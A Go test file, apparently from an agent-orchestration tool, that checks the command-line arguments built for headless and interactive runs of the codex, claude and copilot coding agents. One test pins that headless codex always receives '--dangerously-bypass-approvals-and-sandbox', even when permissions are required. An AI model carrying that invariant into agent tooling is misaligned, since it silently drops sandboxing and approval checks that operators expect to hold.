			t.Fatalf("--fallback-model must not appear in codex args; got %v", args)
		}
	})
}

// TestBuildHeadlessInvocation_OutputSchema verifies the --output-schema flag
// is appended to codex args when cfg.outputSchemaPath is set, and is absent
// for claude and when the path is empty.
func TestBuildHeadlessInvocation_OutputSchema(t *testing.T) {
	t.Parallel()

	t.Run("codex_with_schema_path", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "codex"}
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:           "run tests",
			outputSchemaPath: "/tmp/sybra-codex-schema-12345.json",
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		idx := slices.Index(args, "--output-schema")
		if idx < 0 {
			t.Fatalf("args missing --output-schema; got %v", args)
		}
		if idx+1 >= len(args) || args[idx+1] != "/tmp/sybra-codex-schema-12345.json" {
			t.Errorf("--output-schema value wrong; args=%v", args)
		}
		// Flag must appear before the prompt (last element).
		promptIdx := len(args) - 1
		if idx >= promptIdx {
			t.Errorf("--output-schema must precede the prompt; flag at %d, prompt at %d; args=%v", idx, promptIdx, args)
		}
	})

	t.Run("codex_without_schema_path", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "codex"}
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "run tests"})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		if slices.Contains(args, "--output-schema") {
			t.Fatalf("--output-schema must be absent when outputSchemaPath empty; got %v", args)
		}
	})

	t.Run("claude_ignores_schema_path", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "claude"}
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:           "run tests",
			outputSchemaPath: "/tmp/some-schema.json",
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		if slices.Contains(args, "--output-schema") {
			t.Fatalf("--output-schema must not appear for claude provider; got %v", args)
		}
	})

	t.Run("claude_inline_json_schema", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "claude"}
		schema := `{"type":"object","properties":{"decision":{"type":"string"}}}`
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:       "diagnose",
			OutputSchema: schema,
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		idx := slices.Index(args, "--json-schema")
		if idx < 0 {
			t.Fatalf("args missing --json-schema; got %v", args)
		}
		if idx+1 >= len(args) || args[idx+1] != schema {
			t.Errorf("--json-schema value wrong; args=%v", args)
		}
	})

	t.Run("claude_empty_schema_is_noop", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "claude"}
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "diagnose"})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		if slices.Contains(args, "--json-schema") {
			t.Fatalf("--json-schema must be absent when OutputSchema empty; got %v", args)
		}
	})

	t.Run("claude_json_schema_coexists_with_permission_args", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "claude"}
		schema := `{"type":"object"}`
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:             "diagnose",
			OutputSchema:       schema,
			RequirePermissions: false,
			AllowedTools:       []string{"Read", "Grep"},
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		if !slices.Contains(args, "--json-schema") {
			t.Fatalf("--json-schema missing alongside --allowedTools; got %v", args)
		}
		if !slices.Contains(args, "--allowedTools") {
			t.Fatalf("--allowedTools missing alongside --json-schema; got %v", args)
		}
	})

	t.Run("codex_ignores_inline_output_schema_field", func(t *testing.T) {
		// Codex reads OutputSchema via cfg.outputSchemaPath (written to a temp
		// file by prepareHeadlessAttempt), never the raw OutputSchema string.
		a := &Agent{ID: "a", Provider: "codex"}
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:       "run tests",
			OutputSchema: `{"type":"object"}`,
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		if slices.Contains(args, "--output-schema") {
			t.Fatalf("--output-schema must not appear when only OutputSchema (not outputSchemaPath) is set; got %v", args)
		}
	})
}

// TestCodexSandboxArgs_HeadlessAlwaysBypasses pins the invariant that headless
// codex always bypasses approvals even when RequirePermissions=true. Interactive
// mode with RequirePermissions=true must use --sandbox workspace-write.
func TestCodexSandboxArgs_HeadlessAlwaysBypasses(t *testing.T) {
	t.Setenv("SYBRA_DISABLE_CODEX_SANDBOX", "")
	t.Run("headless_requirePerms_false", func(t *testing.T) {
		args := codexSandboxArgs(false, true)
		if !slices.Contains(args, "--dangerously-bypass-approvals-and-sandbox") {
			t.Errorf("expected bypass; got %v", args)
		}
	})
	t.Run("headless_requirePerms_true", func(t *testing.T) {
		args := codexSandboxArgs(true, true)
		if !slices.Contains(args, "--dangerously-bypass-approvals-and-sandbox") {
			t.Errorf("requirePerms=true headless must bypass; got %v", args)
		}
	})
	t.Run("interactive_requirePerms_true", func(t *testing.T) {
		args := codexSandboxArgs(true, false)
		if !slices.Contains(args, "--sandbox") || !slices.Contains(args, "workspace-write") {
			t.Errorf("interactive+requirePerms should use workspace-write; got %v", args)
		}
	})
	t.Run("interactive_requirePerms_false", func(t *testing.T) {
		args := codexSandboxArgs(false, false)
		if !slices.Contains(args, "--dangerously-bypass-approvals-and-sandbox") {
			t.Errorf("interactive+!requirePerms should bypass; got %v", args)
		}
	})
}

// TestBuildHeadlessInvocation_CodexHooksPresent verifies that when sybra-cli is
// on PATH and a.TaskID is set, codex headless invocations include hook overrides
// and --dangerously-bypass-hook-trust.
func TestBuildHeadlessInvocation_CodexHooksPresent(t *testing.T) {
	makeFakeSybraCLI(t)

	a := &Agent{ID: "a", Provider: "codex", TaskID: "task-abc123"}
	_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "do stuff"})
	if err != nil {
		t.Fatalf("buildHeadlessInvocation: %v", err)
	}

	if !slices.Contains(args, "--dangerously-bypass-hook-trust") {
		t.Errorf("--dangerously-bypass-hook-trust missing from codex args; args=%v", args)
	}

	found := false
	for _, arg := range args {
		if strings.HasPrefix(arg, "hooks.SessionStart=") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("hooks.SessionStart= override not found in codex args; args=%v", args)
	}
}

// TestBuildHeadlessInvocation_CodexHooksAbsentWithEmptyTaskID verifies that
// when TaskID is empty no hook args are injected (fail-open: existing task-less
// invocations must be byte-for-byte unchanged).
func TestBuildHeadlessInvocation_CodexHooksAbsentWithEmptyTaskID(t *testing.T) {
	makeFakeSybraCLI(t)

	a := &Agent{ID: "a", Provider: "codex"} // TaskID empty
	_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "do stuff"})
	if err != nil {
		t.Fatalf("buildHeadlessInvocation: %v", err)
	}

	for _, arg := range args {
		if strings.Contains(arg, "hooks.") {
			t.Errorf("hook override must be absent when TaskID empty; got arg %q", arg)
		}
		if arg == "--dangerously-bypass-hook-trust" {
			t.Errorf("--dangerously-bypass-hook-trust must be absent when TaskID empty")
		}
	}
}

func TestBuildHeadlessInvocation_ClaudeKlaudiushHookPresent(t *testing.T) {
	makeFakeHookBinary(t, "klaudiush")

	a := &Agent{ID: "a", Provider: "claude", TaskID: "task-abc123"}
	_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "do stuff"})
	if err != nil {
		t.Fatalf("buildHeadlessInvocation: %v", err)
	}
	for i, arg := range args {
		if arg == "--settings" && i+1 < len(args) && strings.Contains(args[i+1], "klaudiush --hook-type PreToolUse") {
			return
		}
	}
	t.Fatalf("Claude headless args missing klaudiush --settings hook: %v", args)
}

// TestBuildHeadlessInvocation_ClaudeApprovalHookWiredWhenRequired verifies
// that a headless claude run with RequirePermissions=true wires the same
// PreToolUse HTTP approval hook the conversational runner uses, pointed at
// the manager's approval-server address. Without this, require_permissions
// has no path to grant a headless tool call and operators are forced to
// require_permissions:false, which collapses to --dangerously-skip-permissions.
func TestBuildHeadlessInvocation_ClaudeApprovalHookWiredWhenRequired(t *testing.T) {
	a := &Agent{ID: "a", Provider: "claude", TaskID: "task-abc123"}
	_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{
		Prompt:             "do stuff",
		RequirePermissions: true,
		approvalAddr:       "127.0.0.1:54321",
	})
	if err != nil {
		t.Fatalf("buildHeadlessInvocation: %v", err)
	}
	for i, arg := range args {
		if arg == "--dangerously-skip-permissions" {
			t.Fatalf("RequirePermissions=true must not bypass permissions: %v", args)
		}
		if arg == "--settings" && i+1 < len(args) &&
			strings.Contains(args[i+1], "http://127.0.0.1:54321/hooks/pre-tool-use") {
			return
		}
	}
	t.Fatalf("Claude headless args missing approval-server --settings hook: %v", args)
}

// TestBuildHeadlessInvocation_ClaudeApprovalHookAbsentWithoutRequirePerms
// verifies the approval hook is only wired when the run actually needs
// permission gating — an unattended bypass/auto run must not block on a
// hook nobody is watching.
func TestBuildHeadlessInvocation_ClaudeApprovalHookAbsentWithoutRequirePerms(t *testing.T) {
	a := &Agent{ID: "a", Provider: "claude", TaskID: "task-abc123"}
	_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{
		Prompt:             "do stuff",
		RequirePermissions: false,
		approvalAddr:       "127.0.0.1:54321",
	})
	if err != nil {
		t.Fatalf("buildHeadlessInvocation: %v", err)
	}
	for i, arg := range args {
		if arg == "--settings" && i+1 < len(args) &&
			strings.Contains(args[i+1], "pre-tool-use") {
			t.Fatalf("approval hook must not be wired without RequirePermissions: %v", args)
		}
	}
}

// TestBuildHeadlessInvocation_NonCodex_NoCodexHookArgs verifies that Claude and
// Copilot invocations never receive codex hook args regardless of TaskID.
func TestBuildHeadlessInvocation_NonCodex_NoCodexHookArgs(t *testing.T) {
	makeFakeSybraCLI(t)

	for _, provider := range []string{"claude", "copilot"} {
		t.Run(provider, func(t *testing.T) {
			a := &Agent{ID: "a", Provider: provider, TaskID: "task-abc123"}
			_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "do stuff"})
			if err != nil {
				t.Fatalf("buildHeadlessInvocation: %v", err)
			}
			for _, arg := range args {
				if strings.Contains(arg, "hooks.") {
					t.Errorf("%s: hook override must be absent; got arg %q", provider, arg)
				}
				if arg == "--dangerously-bypass-hook-trust" {
					t.Errorf("%s: --dangerously-bypass-hook-trust must be absent", provider)
				}
			}
		})
	}
}
